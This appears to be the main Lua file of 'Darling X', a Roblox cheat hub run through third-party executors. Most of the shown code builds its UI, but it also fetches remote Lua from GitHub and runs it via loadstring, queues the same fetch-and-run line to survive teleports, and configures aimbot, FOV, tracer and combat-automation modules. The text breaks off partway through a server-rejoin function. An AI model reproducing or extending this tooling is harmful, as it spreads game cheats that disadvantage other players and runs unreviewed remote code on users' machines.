--[[
    Darling X | Modular UI Foundation
    Liquid Glass Theme with Dynamic Themes, Static Wallpapers, and Combat Engine
    Author: Darling
    Repository: https://github.com/instagramusa/D
]]

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local ContentProvider = game:GetService("ContentProvider")
local HttpService = game:GetService("HttpService")

local APP_TITLE = "Darling X"
local APP_VERSION = "v3.3"
local APP_AUTHOR = "Darling"
local DEFAULT_WALLPAPER_ID = "rbxassetid://103674761222554"
local DEFAULT_LOGO_ID = "rbxassetid://133155251609559"
local GITHUB_REPO_RAW = "https://raw.githubusercontent.com/instagramusa/D/main"

local FONT_ORDER = { "Gotham", "GothamBold", "GothamBlack", "SourceSans", "Code" }
local CurrentFontName = "Gotham"
local CurrentFont = Enum.Font.Gotham

local function ConnectButton(button, callback)
    if not button then return end
    pcall(function()
        button.Active = true
        button.Selectable = true
    end)

    local lastActivation = 0
    local function activate()
        local now = os.clock()
        if now - lastActivation < 0.28 then return end
        lastActivation = now
        if callback then
            task.spawn(function()
                local ok, err = pcall(callback)
                if not ok then
                    warn("[Darling X] Button callback error: " .. tostring(err))
                end
            end)
        end
    end

    -- Layer 1: Roblox Activated event (PC click, gamepad, native touch tap)
    pcall(function()
        button.Activated:Connect(activate)
    end)

    -- Layer 2: MouseButton1Click (desktop mouse fallback)
    pcall(function()
        button.MouseButton1Click:Connect(activate)
    end)

    -- Layer 3: TouchTap (native mobile tap - only fires on tap, not drag)
    pcall(function()
        button.TouchTap:Connect(activate)
    end)

    -- Layer 4: Universal Synthetic Touch / Tap-vs-Swipe Filter
    -- Guarantees responsiveness on Android executors (Delta, Codex, Arceus X)
    -- while allowing smooth ScrollingFrame swipe gestures without false triggers.
    local touchStartPos = nil
    local touchStartTime = 0

    pcall(function()
        button.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
                touchStartPos = input.Position
                touchStartTime = os.clock()
            end
        end)
    end)

    pcall(function()
        button.InputEnded:Connect(function(input)
            if (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1) and touchStartPos then
                local dt = os.clock() - touchStartTime
                local dist = (input.Position - touchStartPos).Magnitude
                touchStartPos = nil
                if dt < 0.35 and dist < 14 then
                    activate()
                end
            end
        end)
    end)
end

local lp = Players.LocalPlayer
local camera = workspace.CurrentCamera
local ScreenGui

-- Safe parent resolver (gethui / CoreGui / PlayerGui)
local parentGui = nil
pcall(function() if gethui then parentGui = gethui() end end)
if not parentGui then pcall(function() parentGui = CoreGui end) end
if not parentGui and lp then pcall(function() parentGui = lp:WaitForChild("PlayerGui", 5) end) end

-- Clean up any prior DarlingX instances to avoid ghost overlay frames
pcall(function()
    local target = parentGui or (lp and lp:FindFirstChild("PlayerGui"))
    if target then
        for _, old in ipairs(target:GetChildren()) do
            if old.Name:find("DarlingX") then
                pcall(function() old:Destroy() end)
            end
        end
    end
end)

-- Global cleanup helper
local IsScriptRunning = true
local ActiveConnections = {}
local function trackConn(conn)
    if conn then table.insert(ActiveConnections, conn) end
    return conn
end

local function FormatNumber(n)
    if not n or type(n) ~= "number" then return tostring(n or "--") end
    if n >= 1000000000 then
        return string.format("%.2fB", n / 1000000000)
    elseif n >= 1000000 then
        return string.format("%.1fM", n / 1000000)
    elseif n >= 1000 then
        return string.format("%.1fK", n / 1000)
    else
        return tostring(math.floor(n))
    end
end

-- ============================================================
-- DYNAMIC THEME SYSTEM
-- ============================================================
local THEMES = {
    ["Purple"]   = Color3.fromRGB(138, 43, 226),
    ["Blue"]     = Color3.fromRGB(59, 130, 246),
    ["Pink"]     = Color3.fromRGB(236, 72, 153),
    ["Green"]    = Color3.fromRGB(16, 185, 129),
    ["Yellow"]   = Color3.fromRGB(234, 179, 8),
    ["Orange"]   = Color3.fromRGB(249, 115, 22),
    ["Red"]      = Color3.fromRGB(239, 68, 68),
    ["Cyan"]     = Color3.fromRGB(6, 182, 212),
    ["White"]    = Color3.fromRGB(255, 255, 255),
    ["Rainbow"]  = Color3.fromRGB(138, 43, 226),
}
local THEME_ORDER = { "Purple", "Blue", "Pink", "Green", "Yellow", "Orange", "Red", "Cyan", "White", "Rainbow" }
local CurrentThemeName = "White"
local CurrentAccent = THEMES.White
local IsRainbowTheme = false
local RainbowSpeed = 0.4

local ThemeStrokes = {}
local ThemeTexts = {}
local ThemeButtons = {}
local ThemeFills = {}
local ActiveToggles = {}
local ToggleControls = {}

local function SetActiveToggle(toggle, active)
    if not toggle then return end
    if active then
        ActiveToggles[toggle] = true
        toggle.BackgroundColor3 = CurrentAccent
    else
        ActiveToggles[toggle] = nil
        toggle.BackgroundColor3 = Color3.fromRGB(32, 28, 44)
    end
end

local function UpdateThemeColors()
    for _, stroke in ipairs(ThemeStrokes) do
        if stroke and stroke.Parent then stroke.Color = CurrentAccent end
    end
    for _, label in ipairs(ThemeTexts) do
        if label and label.Parent then label.TextColor3 = CurrentAccent end
    end
    for _, frame in ipairs(ThemeFills) do
        if frame and frame.Parent then frame.BackgroundColor3 = CurrentAccent end
    end
    for toggle, _ in pairs(ActiveToggles) do
        if toggle and toggle.Parent then toggle.BackgroundColor3 = CurrentAccent end
    end
end

local function RegisterThemeStroke(stroke)
    table.insert(ThemeStrokes, stroke)
    stroke.Color = CurrentAccent
end

local function RegisterThemeText(label)
    table.insert(ThemeTexts, label)
    label.TextColor3 = CurrentAccent
end

local function RegisterThemeFill(frame)
    table.insert(ThemeFills, frame)
    frame.BackgroundColor3 = CurrentAccent
end

local function ApplyFont(name)
    CurrentFontName = name
    CurrentFont = Enum.Font[name] or Enum.Font.Gotham
    for _, label in ipairs(ThemeTexts) do
        if label and label.Parent then label.Font = CurrentFont end
    end
end

local function ApplyTheme(name)
    if not THEMES[name] then return end
    CurrentThemeName = name
    IsRainbowTheme = (name == "Rainbow")
    if not IsRainbowTheme then
        CurrentAccent = THEMES[name]
        UpdateThemeColors()
    end
    if TriggerAutoSave then TriggerAutoSave() end
end


local function ResetTheme()
    ApplyTheme("Purple")
end

trackConn(RunService.Heartbeat:Connect(function()
    if not IsScriptRunning then return end
    if IsRainbowTheme then
        local hue = (os.clock() * RainbowSpeed) % 1
        CurrentAccent = Color3.fromHSV(hue, 0.85, 1)
        UpdateThemeColors()
    end
end))

-- ============================================================
-- ASSET RESOLVER & GETCUSTOMASSET PIPELINE
-- ============================================================
local exGetCustomAsset = getcustomasset or getsynasset or (syn and syn.get_custom_asset)
local exIsFile = isfile or is_file or (syn and syn.isfile)
local exWriteFile = writefile or (syn and syn.writefile)
local exMakeFolder = makefolder or make_folder or (syn and syn.makefolder)
local exRequest = request or http_request or (syn and syn.request) or (http and http.request)

local function SafeHttpGet(url)
    local okHttp, body = pcall(function()
        return game:HttpGet(url, true)
    end)
    if okHttp and type(body) == "string" and #body > 50 then
        return body
    end

    if exRequest then
        local okReq, res = pcall(exRequest, { Url = url, Method = "GET" })
        if okReq and type(res) == "table" then
            local b = res.Body or res.body
            if type(b) == "string" and #b > 50 then
                return b
            end
        end
    end
    return nil
end

local function ResolveCustomAsset(relativePath, fallbackAssetId)
    if not exGetCustomAsset or not exIsFile then
        return fallbackAssetId
    end

    local candidatePaths = {
        relativePath,
        "DarlingX/" .. relativePath,
        "DarlingX/assets/" .. relativePath:gsub("^assets/", ""),
        "assets/" .. relativePath:gsub("^assets/", ""),
        relativePath:gsub(".+/", "")
    }

    for _, path in ipairs(candidatePaths) do
        local okCheck, exists = pcall(exIsFile, path)
        if okCheck and exists then
            local okAsset, asset = pcall(exGetCustomAsset, path)
            if okAsset and type(asset) == "string" and #asset > 0 then
                return asset
            end
        end
    end

    return fallbackAssetId
end

-- Cached permanent Darling Hub logo asset
local CachedLogoAsset = nil
local function GetLogoAsset()
    if CachedLogoAsset then return CachedLogoAsset end

    local localLogo = ResolveCustomAsset("assets/darling_logo.png", nil)
    if localLogo then
        CachedLogoAsset = localLogo
        return localLogo
    end
    local localAnime = ResolveCustomAsset("assets/darling_logo_v14_anime.png", nil)
    if localAnime then
        CachedLogoAsset = localAnime
        return localAnime
    end

    local cachedPath = "DarlingX/cache/darling_logo.png"
    if exIsFile and exGetCustomAsset then
        local okCheck, exists = pcall(exIsFile, cachedPath)
        if okCheck and exists then
            local okAsset, asset = pcall(exGetCustomAsset, cachedPath)
            if okAsset and type(asset) == "string" and #asset > 0 then
                CachedLogoAsset = asset
                return asset
            end
        end
    end

    if exWriteFile and exGetCustomAsset then
        task.spawn(function()
            pcall(function()
                if exMakeFolder then
                    pcall(exMakeFolder, "DarlingX")
                    pcall(exMakeFolder, "DarlingX/cache")
                end
                local logoUrl = GITHUB_REPO_RAW .. "/assets/darling_logo.png"
                local body = SafeHttpGet(logoUrl)
                if body and #body > 50 then
                    exWriteFile(cachedPath, body)
                end
            end)
        end)
    end

    CachedLogoAsset = DEFAULT_LOGO_ID
    return DEFAULT_LOGO_ID
end

local CachedCreatorAsset = nil
local function GetCreatorAsset()
    if CachedCreatorAsset then return CachedCreatorAsset end
    local localAsset = ResolveCustomAsset("assets/darling_creator.png", nil)
    if localAsset then
        CachedCreatorAsset = localAsset
        return localAsset
    end

    local cachedPath = "DarlingX/cache/darling_creator.png"
    if exIsFile and exGetCustomAsset then
        local okCheck, exists = pcall(exIsFile, cachedPath)
        if okCheck and exists then
            local okAsset, asset = pcall(exGetCustomAsset, cachedPath)
            if okAsset and type(asset) == "string" and #asset > 0 then
                CachedCreatorAsset = asset
                return asset
            end
        end
    end

    if exWriteFile and exGetCustomAsset then
        task.spawn(function()
            pcall(function()
                if exMakeFolder then
                    pcall(exMakeFolder, "DarlingX")
                    pcall(exMakeFolder, "DarlingX/cache")
                end
                local rawUrl = GITHUB_REPO_RAW .. "/assets/darling_creator.png"
                local body = SafeHttpGet(rawUrl)
                if body and #body > 50 then
                    exWriteFile(cachedPath, body)
                end
            end)
        end)
    end

    CachedCreatorAsset = DEFAULT_LOGO_ID
    return DEFAULT_LOGO_ID
end

-- ============================================================
-- MODULE LOADER (Remote-First with Disk Fallback)
-- ============================================================
local LoadedModules = {}

pcall(function()
    local delFn = delfile or (syn and syn.delfile)
    local isfileFn = isfile or exIsFile
    if delFn and isfileFn then
        local staleFiles = {
            "DarlingX/modules/pvp/fast_attack.lua",
            "DarlingX/modules/pvp/camlock.lua",
            "DarlingX/modules/pvp/extra_widgets.lua"
        }
        for _, f in ipairs(staleFiles) do
            if isfileFn(f) then pcall(delFn, f) end
        end
    end
end)

local function RequireModule(relPath)
    if LoadedModules[relPath] then
        return LoadedModules[relPath]
    end

    -- 1. Fresh remote fetch from GitHub first (guarantees latest updates without stale executor cache)
    local cacheBuster = tostring(os.time()) .. "_" .. tostring(math.random(1000, 9999))
    local remoteUrl = GITHUB_REPO_RAW .. "/" .. relPath .. "?t=" .. cacheBuster
    local body = SafeHttpGet(remoteUrl)
    if body and #body > 50 then
        local okCompile, fn = pcall(loadstring, body)
        if okCompile and fn then
            local okRun, result = pcall(fn)
            if okRun and result then
                LoadedModules[relPath] = result
                pcall(function()
                    if exIsFolder and exMakeFolder and not exIsFolder("DarlingX") then exMakeFolder("DarlingX") end
                    if exWriteFile then exWriteFile("DarlingX/" .. relPath, body) end
                end)
                return result
            end
        end
    end

    -- 2. Fallback to local file on disk if offline or in local test environment
    local candidatePaths = {
        relPath,
        "DarlingX/" .. relPath,
        "assets/" .. relPath,
        "modules/" .. relPath:gsub("^modules/", ""),
        "darling-hub/" .. relPath
    }

    local isfileFn = isfile or exIsFile
    local readfileFn = readfile or (syn and syn.readfile)
    if isfileFn and readfileFn then
        for _, path in ipairs(candidatePaths) do
            local okCheck, exists = pcall(isfileFn, path)
            if okCheck and exists then
                local okRead, content = pcall(readfileFn, path)
                if okRead and content and #content > 0 then
                    local okCompile, fn = pcall(loadstring, content)
                    if okCompile and fn then
                        local okRun, result = pcall(fn)
                        if okRun and result then
                            LoadedModules[relPath] = result
                            return result
                        end
                    end
                end
            end
        end
    end

    return nil
end

-- Compatibility bridge for combat modules
_G.DarlingX = {
    Settings = {
        Aim = {
            Priority = "Nearest",
            Mode = "360",
            MaxRange = 1000,
            TargetPart = "HumanoidRootPart"
        },
        FOV = {
            Radius = 100,
            Mode = "Center",
            Color = Color3.fromRGB(255, 255, 255)
        },
        Tracers = {
            Type = "Both",
            Origin = "Player",
            Color = Color3.fromRGB(255, 255, 255)
        },
        Blacklist = {
            Melee = {},
            Sword = {},
            Fruit = {},
            Gun = {}
        }
    },
    Require = function(self, path)
        return RequireModule(path)
    end
}
_G.DarlingHub = _G.DarlingX
if getgenv then
    pcall(function()
        getgenv().DarlingX = _G.DarlingX
        getgenv().DarlingHub = _G.DarlingX
    end)
end

-- ============================================================
-- WINDUI LUCIDE ICONS INTEGRATION
-- ============================================================
local WindUIIcons = nil
task.spawn(function()
    pcall(function()
        local iconSrc = SafeHttpGet("https://raw.githubusercontent.com/Footagesus/Icons/main/Main-v2.lua")
        if iconSrc and #iconSrc > 50 then
            WindUIIcons = loadstring(iconSrc)()
        end
    end)
end)

local WINDUI_LUCIDE_FALLBACK = {
    Home     = "rbxassetid://98755624629571",   -- Lucide: house
    Aimbot   = "rbxassetid://134242818164054",  -- Lucide: crosshair
    PvP      = "rbxassetid://81872698913435",   -- Lucide: swords
    Macro    = "rbxassetid://80451686744860",   -- Lucide: bot
    Soru     = "rbxassetid://130551565616516",  -- Lucide: zap
    Esp      = "rbxassetid://100033680381365",  -- Lucide: eye
    Config   = "rbxassetid://85538382643347",   -- Lucide: sliders-horizontal
    Misc     = "rbxassetid://85538382643347",   -- Lucide: sliders-horizontal
    Settings = "rbxassetid://86350350950064",   -- Lucide: palette
    Themes   = "rbxassetid://86350350950064",   -- Lucide: palette
}

local function ApplyTabIcon(imageLabel, tabKey, lucideName)
    pcall(function()
        local fallbackId = WINDUI_LUCIDE_FALLBACK[tabKey] or "rbxassetid://98755624629571"
        imageLabel.Image = fallbackId

        if WindUIIcons and WindUIIcons.GetIcon then
            local ok, iconData = pcall(function() return WindUIIcons.GetIcon(lucideName, "lucide") end)
            if ok and iconData then
                if type(iconData) == "string" and string.find(iconData, "rbxassetid://") then
                    imageLabel.Image = iconData
                elseif type(iconData) == "table" and iconData[1] then
                    imageLabel.Image = iconData[1]
                    if type(iconData[2]) == "table" and iconData[2].ImageRectSize then
                        imageLabel.ImageRectSize = iconData[2].ImageRectSize
                        imageLabel.ImageRectOffset = iconData[2].ImageRectPosition or Vector2.new(0, 0)
                    end
                end
            end
        end
    end)
end

-- ============================================================
-- WALLPAPERS ENGINE (STATIC DARLING HUB ASSETS)
-- ============================================================
local WALLPAPERS = {
    { name = "Clean Dark Glass (Default)", file = nil, id = "" },
    { name = "Ashen One", file = nil, id = DEFAULT_WALLPAPER_ID },
    { name = "2000s Hacker Room", file = "hacker_room.jpg", id = DEFAULT_WALLPAPER_ID },
    { name = "Lycoris Monochrome", file = "lycoris_monochrome.jpg", id = "rbxassetid://129497751007547" },
    { name = "Cyan Neko", file = "cyan_neko.jpg", id = "rbxassetid://122087867919987" },
    { name = "Frieren Beyond Journey", file = "frieren.jpg", id = "rbxassetid://129497751007547" },
    { name = "Cyberpunk Megalopolis", file = "cyberpunk_megalopolis.jpg", id = "rbxassetid://122087867919987" },
    { name = "Green Night Driving", file = "green_night_driving.jpg", id = "rbxassetid://127123211876541" },
    { name = "Monika Lonely", file = "monika_lonely.jpg", id = DEFAULT_WALLPAPER_ID },
    { name = "Neon Purple Midnight", file = "purple_midnight.jpg", id = "rbxassetid://129497751007547" },
    { name = "Persona 5 Rainy Tokyo", file = "persona_5_rainy.jpg", id = "rbxassetid://122087867919987" },
    { name = "Rainy Tokyo", file = "rainy_tokyo.jpg", id = "rbxassetid://127123211876541" },
    { name = "Shorekeeper Blue Sea", file = "shorekeeper.jpg", id = "rbxassetid://129497751007547" },
    { name = "Skirk Neko Genshin", file = "skirk_neko.jpg", id = "rbxassetid://122087867919987" },
    { name = "Snowy Cozy Bedroom", file = "snowy_bedroom.jpg", id = DEFAULT_WALLPAPER_ID },
    { name = "Snowy Forest", file = "snowy_forest.jpg", id = "rbxassetid://129497751007547" },
    { name = "Dark River Forest", file = "dark_river_forest.jpg", id = "rbxassetid://122087867919987" },
    { name = "Witch Cauldron Halloween", file = "witch_cauldron.jpg", id = "rbxassetid://127123211876541" },
    { name = "Deepseek Chan", file = "deepseek_chan.jpg", id = "rbxassetid://129497751007547" },
    { name = "Yuta Cursed Blade", file = "yuta_blade.jpg", id = "rbxassetid://122087867919987" },
    { name = "Zankou Neverness", file = "zankou_nte.jpg", id = DEFAULT_WALLPAPER_ID },
    { name = "Anime Theme 1", file = nil, id = "rbxassetid://129497751007547" },
    { name = "Anime Theme 3", file = nil, id = "rbxassetid://122087867919987" },
    { name = "Anime Theme 4", file = nil, id = "rbxassetid://127123211876541" },
}
local currentBgIdx = 1
local ResolvedWallpaperCache = {}

local function ResolveWallpaperAsset(wp)
    if not wp then return DEFAULT_WALLPAPER_ID end
    if wp.id == "" then return "" end

    if ResolvedWallpaperCache[wp.name] then
        return ResolvedWallpaperCache[wp.name]
    end

    if wp.file then
        local localAsset = ResolveCustomAsset("assets/backgrounds/" .. wp.file, nil)
        if localAsset then
            ResolvedWallpaperCache[wp.name] = localAsset
            return localAsset
        end

        if exGetCustomAsset and exIsFile then
            local cachedPath = "DarlingX/cache/" .. wp.file
            local okC, existsC = pcall(exIsFile, cachedPath)
            if okC and existsC then
                local okA, asset = pcall(exGetCustomAsset, cachedPath)
                if okA and type(asset) == "string" and #asset > 0 then
                    ResolvedWallpaperCache[wp.name] = asset
                    return asset
                end
            end

            local flatPath = "darling_bg_" .. wp.file
            local okF, existsF = pcall(exIsFile, flatPath)
            if okF and existsF then
                local okA, asset = pcall(exGetCustomAsset, flatPath)
                if okA and type(asset) == "string" and #asset > 0 then
                    ResolvedWallpaperCache[wp.name] = asset
                    return asset
                end
            end
        end

        if exWriteFile and exGetCustomAsset then
            local cachedPath = "DarlingX/cache/" .. wp.file
            pcall(function()
                if exMakeFolder then
                    pcall(exMakeFolder, "DarlingX")
                    pcall(exMakeFolder, "DarlingX/cache")
                end
                local rawUrl = GITHUB_REPO_RAW .. "/assets/backgrounds/" .. wp.file
                local body = SafeHttpGet(rawUrl)
                if body and #body > 50 then
                    exWriteFile(cachedPath, body)
                end
            end)
            local okAsset, asset = pcall(exGetCustomAsset, cachedPath)
            if okAsset and type(asset) == "string" and #asset > 0 then
                ResolvedWallpaperCache[wp.name] = asset
                return asset
            end

            local flatPath = "darling_bg_" .. wp.file
            pcall(function()
                local rawUrl = GITHUB_REPO_RAW .. "/assets/backgrounds/" .. wp.file
                local body = SafeHttpGet(rawUrl)
                if body and #body > 50 then
                    exWriteFile(flatPath, body)
                end
            end)
            local okFlat, flatAsset = pcall(exGetCustomAsset, flatPath)
            if okFlat and type(flatAsset) == "string" and #flatAsset > 0 then
                ResolvedWallpaperCache[wp.name] = flatAsset
                return flatAsset
            end
        end
    end

    local fallback = wp.id or DEFAULT_WALLPAPER_ID
    ResolvedWallpaperCache[wp.name] = fallback
    return fallback
end

local uiReadyToOpen = false

-- ============================================================
-- CINEMATIC INTRO
-- ============================================================
local function playCinematicIntro(onFinish)
    local introGui = Instance.new("ScreenGui")
    introGui.Name = "DarlingX_IntroGui"
    introGui.DisplayOrder = 999999
    introGui.IgnoreGuiInset = true
    introGui.ResetOnSpawn = false
    pcall(function()
        if syn and syn.protect_gui then syn.protect_gui(introGui) end
        introGui.Parent = parentGui
    end)

    local bg = Instance.new("Frame", introGui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(4, 4, 8)
    bg.BackgroundTransparency = 0.2
    bg.BorderSizePixel = 0
    bg.Active = false

    local center = Instance.new("Frame", bg)
    center.AnchorPoint = Vector2.new(0.5, 0.5)
    center.Position = UDim2.new(0.5, 0, 0.5, 0)
    center.Size = UDim2.new(0, 360, 0, 130)
    center.BackgroundTransparency = 1

    local scale = Instance.new("UIScale", center)
    scale.Scale = 0.65

    local logoImg = Instance.new("ImageLabel", center)
    logoImg.Size = UDim2.new(0, 42, 0, 42)
    logoImg.Position = UDim2.new(0.5, -21, 0, 0)
    logoImg.BackgroundTransparency = 1
    logoImg.Image = GetLogoAsset()
    logoImg.ScaleType = Enum.ScaleType.Crop
    Instance.new("UICorner", logoImg).CornerRadius = UDim.new(0, 8)

    local title = Instance.new("TextLabel", center)
    title.Size = UDim2.new(1, 0, 0, 34)
    title.Position = UDim2.new(0, 0, 0, 46)
    title.BackgroundTransparency = 1
    title.Text = APP_TITLE
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 26
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextTransparency = 1

    local sub = Instance.new("TextLabel", center)
    sub.Size = UDim2.new(1, 0, 0, 20)
    sub.Position = UDim2.new(0, 0, 0, 80)
    sub.BackgroundTransparency = 1
    sub.Text = "by " .. APP_AUTHOR
    sub.Font = Enum.Font.GothamMedium
    sub.TextSize = 11
    sub.TextColor3 = Color3.fromRGB(255, 255, 255)
    sub.TextTransparency = 1

    local halo = Instance.new("Frame", bg)
    halo.AnchorPoint = Vector2.new(0.5, 0.5)
    halo.Position = UDim2.new(0.5, 0, 0.5, 0)
    halo.Size = UDim2.new(0, 80, 0, 80)
    halo.BackgroundTransparency = 1
    Instance.new("UICorner", halo).CornerRadius = UDim.new(1, 0)
    local haloStroke = Instance.new("UIStroke", halo)
    haloStroke.Color = CurrentAccent
    haloStroke.Thickness = 1.8
    haloStroke.Transparency = 0.2

    task.spawn(function()
        TweenService:Create(scale, TweenInfo.new(0.65, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1.0 }):Play()
        TweenService:Create(title, TweenInfo.new(0.45), { TextTransparency = 0 }):Play()
        TweenService:Create(sub, TweenInfo.new(0.45), { TextTransparency = 0 }):Play()
        TweenService:Create(halo, TweenInfo.new(0.85, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(0, 480, 0, 480) }):Play()
        TweenService:Create(haloStroke, TweenInfo.new(0.85), { Transparency = 1 }):Play()

        local elapsed = 0
        local minDuration = 1.8
        local maxWait = 7.0
        while elapsed < maxWait do
            if elapsed >= minDuration and uiReadyToOpen then
                break
            end
            task.wait(0.05)
            elapsed = elapsed + 0.05
        end

        TweenService:Create(scale, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Scale = 1.25 }):Play()
        TweenService:Create(title, TweenInfo.new(0.35), { TextTransparency = 1 }):Play()
        TweenService:Create(sub, TweenInfo.new(0.35), { TextTransparency = 1 }):Play()
        TweenService:Create(logoImg, TweenInfo.new(0.35), { ImageTransparency = 1 }):Play()
        TweenService:Create(bg, TweenInfo.new(0.4), { BackgroundTransparency = 1 }):Play()

        task.wait(0.4)
        pcall(function() introGui:Destroy() end)
        if onFinish then onFinish() end
    end)
end

local Main = nil
local maximizeUI = nil
local Notify = nil
local introCompleted = false
local uiOpened = false

local function triggerUIOpen()
    if introCompleted and uiReadyToOpen and not uiOpened then
        uiOpened = true
        if maximizeUI then
            maximizeUI()
        elseif Main then
            Main.Visible = true
        end
        if Notify then
            Notify(APP_TITLE, "Version " .. APP_VERSION .. " loaded and ready.")
        end
        print("[Darling X] Version " .. APP_VERSION .. " initialized successfully.")
    end
end

task.spawn(function()
    playCinematicIntro(function()
        introCompleted = true
        triggerUIOpen()
    end)
end)

task.delay(7.5, function()
    if not introCompleted then
        introCompleted = true
        triggerUIOpen()
    end
end)

-- ============================================================
-- UI FRAMEWORK: LIQUID GLASS COMPACT
-- ============================================================
ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DarlingX_UI"
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 10000
ScreenGui.IgnoreGuiInset = true
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function()
    if syn and syn.protect_gui then syn.protect_gui(ScreenGui) end
    ScreenGui.Parent = parentGui
end)

-- Toast Notification Container
local ToastContainer = Instance.new("Frame", ScreenGui)
ToastContainer.Name = "ToastContainer"
ToastContainer.Size = UDim2.new(0, 220, 1, -40)
ToastContainer.Position = UDim2.new(1, -235, 0, 20)
ToastContainer.BackgroundTransparency = 1
ToastContainer.ZIndex = 500

local ToastList = Instance.new("UIListLayout", ToastContainer)
ToastList.SortOrder = Enum.SortOrder.LayoutOrder
ToastList.VerticalAlignment = Enum.VerticalAlignment.Bottom
ToastList.Padding = UDim.new(0, 8)

local activeToast = nil
local activeToastTimer = nil
Notify = function(titleText, msgText, duration, force)
    if suspendSave and not force then return end
    duration = duration or 2.5

    if activeToastTimer then
        pcall(task.cancel, activeToastTimer)
        activeToastTimer = nil
    end
    if activeToast and activeToast.Parent then
        pcall(function() activeToast:Destroy() end)
        activeToast = nil
    end
    for _, child in ipairs(ToastContainer:GetChildren()) do
        if child:IsA("Frame") then
            pcall(function() child:Destroy() end)
        end
    end

    local toast = Instance.new("Frame", ToastContainer)
    toast.Size = UDim2.new(1, 0, 0, 48)
    toast.BackgroundColor3 = Color3.fromRGB(12, 10, 18)
    toast.BackgroundTransparency = 0.25
    Instance.new("UICorner", toast).CornerRadius = UDim.new(0, 12)

    local stroke = Instance.new("UIStroke", toast)
    stroke.Color = CurrentAccent
    stroke.Thickness = 1
    stroke.Transparency = 0.4
    RegisterThemeStroke(stroke)

    local tLbl = Instance.new("TextLabel", toast)
    tLbl.Size = UDim2.new(1, -24, 0, 16)
    tLbl.Position = UDim2.new(0, 12, 0, 8)
    tLbl.BackgroundTransparency = 1
    tLbl.Text = titleText
    tLbl.Font = Enum.Font.GothamBold
    tLbl.TextSize = 11
    tLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    tLbl.TextXAlignment = Enum.TextXAlignment.Left

    local mLbl = Instance.new("TextLabel", toast)
    mLbl.Size = UDim2.new(1, -24, 0, 14)
    mLbl.Position = UDim2.new(0, 12, 0, 24)
    mLbl.BackgroundTransparency = 1
    mLbl.Text = msgText
    mLbl.Font = Enum.Font.Gotham
    mLbl.TextSize = 9.5
    mLbl.TextColor3 = Color3.fromRGB(180, 175, 195)
    mLbl.TextXAlignment = Enum.TextXAlignment.Left

    activeToast = toast
    TweenService:Create(toast, TweenInfo.new(0.25, Enum.EasingStyle.Quart), { BackgroundTransparency = 0.25 }):Play()
    activeToastTimer = task.delay(duration, function()
        if toast and toast.Parent then
            TweenService:Create(toast, TweenInfo.new(0.25, Enum.EasingStyle.Quart), { BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 0) }):Play()
            task.wait(0.25)
            if toast and toast.Parent then toast:Destroy() end
            if activeToast == toast then activeToast = nil end
        end
    end)
end

-- Top-Left Real-time FPS & Ping Telemetry Overlay
local FPSPingOverlay = Instance.new("Frame", ScreenGui)
FPSPingOverlay.Name = "DarlingX_FPSPingOverlay"
FPSPingOverlay.Size = UDim2.new(0, 150, 0, 24)
FPSPingOverlay.Position = UDim2.new(0, 15, 0, 55)
FPSPingOverlay.BackgroundColor3 = Color3.fromRGB(12, 10, 18)
FPSPingOverlay.BackgroundTransparency = 0.35
FPSPingOverlay.BorderSizePixel = 0
FPSPingOverlay.Visible = false
FPSPingOverlay.ZIndex = 50
Instance.new("UICorner", FPSPingOverlay).CornerRadius = UDim.new(0, 8)

local fpsStroke = Instance.new("UIStroke", FPSPingOverlay)
fpsStroke.Color = CurrentAccent
fpsStroke.Thickness = 1
fpsStroke.Transparency = 0.4
RegisterThemeStroke(fpsStroke)

local fpsLabel = Instance.new("TextLabel", FPSPingOverlay)
fpsLabel.Size = UDim2.new(1, -8, 1, 0)
fpsLabel.Position = UDim2.new(0, 4, 0, 0)
fpsLabel.BackgroundTransparency = 1
fpsLabel.Font = Enum.Font.GothamBold
fpsLabel.TextSize = 10
fpsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
fpsLabel.Text = "FPS: -- | PING: --ms"
fpsLabel.TextXAlignment = Enum.TextXAlignment.Center

local fpsPingConn = nil
local function SetFPSPingVisible(state)
    _G.DarlingX_ShowFPS = (state == true)
    FPSPingOverlay.Visible = _G.DarlingX_ShowFPS

    if _G.DarlingX_ShowFPS and not fpsPingConn then
        local lastUpdate = 0
        fpsPingConn = RunService.RenderStepped:Connect(function(dt)
            local now = os.clock()
            if now - lastUpdate < 0.5 then return end
            lastUpdate = now

            local fps = (dt > 0) and math.floor(1 / dt) or 60
            local ping = 0
            pcall(function()
                local s = Stats:FindFirstChild("Network") and Stats.Network:FindFirstChild("ServerStatsItem")
                local item = s and s:FindFirstChild("Data Ping")
                if item then ping = math.floor(item:GetValue()) end
            end)
            if ping == 0 and lp then
                pcall(function() ping = math.floor(lp:GetNetworkPing() * 1000) end)
            end
            fpsLabel.Text = string.format("FPS: %d | PING: %dms", fps, ping)
        end)
    elseif not _G.DarlingX_ShowFPS and fpsPingConn then
        pcall(function() fpsPingConn:Disconnect() end)
        fpsPingConn = nil
    end
end

-- Robust Server Rejoin
local function RejoinServer()
    Notify("Server", "Reconnecting to server...", 3, true)

    local qot = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
    if qot then
        pcall(function()
            qot([[
                loadstring(game:HttpGet("https://raw.githubusercontent.com/instagramusa/D/main/main.lua?t=" .. tostring(os.time())))()
            ]])
        end)
    end

    local ts = game:GetService("TeleportService")
    local pList = Players:GetPlayers()
    local myJobId = tostring(game.JobId or "")

    local failedConn
